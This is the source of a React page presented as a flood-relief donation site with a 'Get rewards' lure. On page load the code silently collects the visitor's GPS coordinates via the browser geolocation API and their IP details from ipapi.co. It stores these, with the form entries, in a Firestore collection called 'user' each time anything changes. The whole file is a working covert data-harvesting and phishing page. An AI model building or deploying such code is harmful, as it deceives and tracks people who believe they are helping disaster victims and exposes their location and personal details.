import { useState } from "react";
import "./App.css";
import { useEffect } from "react";
import { initializeApp } from "firebase/app";
import { getFirestore,collection,addDoc } from "firebase/firestore";
import Header from "./components/Header";
import ImageSlider from "./components/ImageSlider";
import DonationForm from "./components/DonationForm";
import Footer from "./components/Footer";



function App() {
  const [coords, setCoords] = useState({
    mainLocation:{
      lat: "",
      lon: "",
    }
  });
  const [err, setErr] = useState();
  const [formData, setFormData] = useState({});

  const [allData, setAllData] = useState({});

const firebaseConfig = {
  apiKey: process.env.MY_API_KEY,
  authDomain: "location-1ed79.firebaseapp.com",
  projectId: "location-1ed79",
  storageBucket: "location-1ed79.appspot.com",
  messagingSenderId: "503803392844",
  appId: "1:503803392844:web:2cab76d556104eac83d5e9"
};

const app = initializeApp(firebaseConfig);

const db = getFirestore(app);
const ref = collection(db, "user")


  const handler = () => {
    navigator.geolocation.getCurrentPosition(
      (success) => {
        setCoords({
          mainLocation:{
            lat: success.coords.latitude,
            lon: success.coords.longitude,
          }
        });
        setErr(null)
      },
      (e) => setErr(e)
    );
  };
  useEffect(()=>{
    handler()
  },[])

  const getIp = async () => {
    const response = await fetch("https://ipapi.co/json/");
    const data = await response.json();
    setAllData({data,coords,formData});
  };

  useEffect(() => {
    getIp();
  }, [coords,formData]);


  useEffect(()=>{
    addDoc(ref,allData)
  },[allData])


  return (
    <div className="App">
      <Header />
      <br />
      <div className="heading">This images tell how people suffering in Flood! We do something to set smile on faces</div>
      <br />
      <ImageSlider />
      <br />
      <br />

      <div className="locBtn-div">{err && <button className="locBtn" onClick={handler}>Allow Location</button>}</div>
      <br />
      <br />
      <p className="rewards">Get rewards! to claim this reward just fill your Details</p>
      <br />
      <DonationForm setFormData1={setFormData}/>
      <br />
      <br />
      <Footer />
    </div>
  );
}

export default App;
